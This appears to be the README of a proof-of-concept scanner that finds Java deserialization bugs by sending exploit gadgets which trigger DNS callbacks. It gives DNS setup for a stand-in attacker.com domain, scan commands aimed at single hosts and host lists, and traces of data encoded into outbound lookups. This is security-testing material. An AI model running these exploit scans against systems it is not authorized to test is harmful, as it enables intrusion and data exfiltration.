# Break Fast Serial

A proof of concept that demonstrates asynchronous scanning of deserialization bugs. It repackages [well known exploits](https://github.com/breenmachine/JavaUnserializeExploits) with a modified gadget that triggers DNS queries.

Detailed explanation: http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/

## DNS Chef configuration

The DNS Chef instance is a requirement to see the results of the scan.

This is the typical DNS configuration expected on your domain registrar. It will signify to other DNS servers that all subdomains of `attacker.com` must be resolved by the DNS server host at `10.11.12.13`.
```
NS scanner.attacker.com dnschef.attacker.com
A dnschef.attacker.com 10.11.12.13
```

 - `10.11.12.13` : The public IP address that is 
 - `attacker.com` : A domain name you own

It is highly recommended to use this [modified version of DNS Chef](./dnschef) that decodes the metadata placed by the scanner.

## Single IP scan

Launch DNSChef
```
python dnschef.py -q --fakeip 127.0.0.1 -i 0.0.0.0
```

Launch the scanner
```
python breakfast.py -t 192.168.40.1 -p 7001 -d scanner.attacker.com
```

## Mass Scan

Build a list of ip/hostname with open **HTTP** ports. Use a port scanner such as NMAP to identify port that respond to HTTP.
```
$ cat list_servers.txt
192.168.40.10:80
192.168.40.24:8181
192.168.40.100:7001
192.168.40.100:8080
192.168.40.102:8080
192.168.40.102:8001
```

Launch DNSChef
```
python dnschef.py -q --fakeip 127.0.0.1 -i 0.0.0.0
```

Launch the scanner
```
cat list_servers.txt | python breakfast.py -stdin -d scanner.attacker.com
```

## Expected response

If the vulnerability is confirmed, the expected trace from DNS Chef is as follows.

```
['843', 'jboss', '192.168.40.24', '8181']
[06:16:44] 69.165.172.165: cooking the response of type 'A' for 3834333a6a626f73733a3132372e302e302e313a38313831.scan.fsociety.com to 127.0.0.1
['914', 'jenkins-cli', '192.168.40.102', '8080']
[06:16:45] 173.194.103.14: cooking the response of type 'A' for 3931343a6a656e6b696e732d636c693a3132372e302e302e313a38303830.scanner.fsociety.com to 127.0.0.1
```
